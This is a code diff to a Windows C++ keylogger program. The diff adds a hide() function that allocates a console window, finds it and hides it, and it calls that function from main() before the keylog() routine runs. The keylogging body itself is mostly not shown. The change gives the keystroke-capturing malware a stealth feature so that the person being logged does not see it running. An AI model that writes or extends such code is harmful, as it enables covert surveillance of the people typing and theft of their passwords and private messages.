@@ -3,6 +3,13 @@
 #include <Winuser.h> 
 #include <fstream>    
 using namespace std;
+//...[+]Hide automatically....
+void hide(){
+	HWND stealth;
+	AllocConsole();
+	stealth = FindWindowA("ConsoleWindowClass",NULL);
+	ShowWindow(stealth,0);
+}
 
 void keylog(){
 	char key;
@@ -103,6 +110,8 @@ void keylog(){
 }
 
 int main(){
+	hide();
+	//ShowWindow(GetConsoleWindow(), SW_HIDE);
 	keylog();
 	return 0;
 }
